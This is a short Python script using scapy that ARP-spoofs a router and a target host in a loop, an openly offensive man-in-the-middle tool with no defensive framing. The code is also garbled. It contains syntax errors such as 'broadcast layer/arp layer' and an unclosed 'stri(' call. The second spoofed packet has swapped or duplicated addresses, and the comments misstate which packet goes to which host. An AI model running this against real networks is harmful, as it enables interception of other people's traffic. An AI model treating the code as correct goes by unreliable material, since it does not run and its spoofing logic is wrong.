
import scapy.all as scapy
import sys
import time


def get_mac_address(ip_address):
   
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast layer/arp layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    #sending packet to target router and target machine to spoof both together
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    #packet1 is sent to target ip pretending to come from router
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=router_ip, psrc=router_ip)
    #packet2 is sent to router ip pretending to come from target
    scapy.send(packet1)
    scapy.send(packet2)

target_ip = sys.argv[2]

router_ip = stri(sys.argv[1]

target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)
